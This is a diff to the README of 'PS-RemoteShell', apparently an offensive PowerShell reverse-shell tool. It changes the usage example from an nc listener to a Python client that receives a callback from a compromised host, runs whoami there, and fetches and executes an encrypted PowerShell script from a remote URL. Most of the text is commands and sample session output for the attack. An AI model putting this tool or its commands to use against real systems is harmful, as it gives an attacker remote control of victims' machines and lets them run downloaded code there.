@@ -8,23 +8,30 @@ PS-RemoteShell -ip 1.1.1.1 -port 1111 -key 1111
 
 # Example
 ```
-$ nc -lv 8080
-(192.168.70.133:RINGZER0\me):Url >null
-(null):Exec >whoami
-RINGZER0\me
+$ python PsShellClient.py 10.0.0.144 8080 test
+PS-RemoteShell Python Client v1.0
+Mr.Un1k0d3r RingZer0 Team
 
-(192.168.70.133:RINGZER0\me):Url >https://home.ringzer0team.com/ps.php
-(https://home.ringzer0team.com/ps.php):Exec >Get-BrowserHomepage
+
+[*] Waiting for a connection...
+[+] Callback from 10.0.0.144:49758
+(192.168.70.133:RINGZER0\ME):Url >https://home.ringzer0team.com/ps.php
+(https://home.ringzer0team.com/ps.php):Exec >
 
 Start Page
 ----------
 http://go.microsoft.com/fwlink/p/?LinkId=255141
 
+
+
+(192.168.70.133:RINGZER0\ME):Url >null
+(null):Exec >whoami
+RINGZER0\ME
+
+(192.168.70.133:RINGZER0\ME):Url >
+
 The ps.php file located at https://home.ringzer0team.com/ps.php is encrypted using the following key: test
 ```
-
-# TODO
-make a client to encrypt the whole communication.
 
 # Credit 
 Mr.Un1k0d3r RingZer0 Team
